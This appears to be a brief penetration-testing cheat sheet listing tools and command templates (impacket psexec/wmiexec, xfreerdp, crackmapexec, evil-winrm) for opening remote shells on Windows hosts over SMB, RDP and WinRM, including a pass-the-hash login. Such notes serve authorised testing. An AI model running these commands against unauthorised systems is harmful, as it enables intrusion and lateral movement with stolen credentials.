# Remote Shell
## SMB & RPC: 445, 135
impacket-psexec
impacket-smbexec
`impacket-wmiexec '<DOMAIN>/<USER>:<PASS>@<IP>'`
winexe

## RDP: 3389
`impacket-rdp_check <DOMAIN>/<USER>:<PASS>@<IP>` check
rdesktop 
xfreerdp
remmina

## WinRM: 5985, 5986
`crackmapexec winrm <IP> -u <USER> -p <PASS>` check
`evil-winrm -i <IP> -u <USER> -p <PASS>`
`evil-winrm -i <IP> -u <USER> -H <HASH>`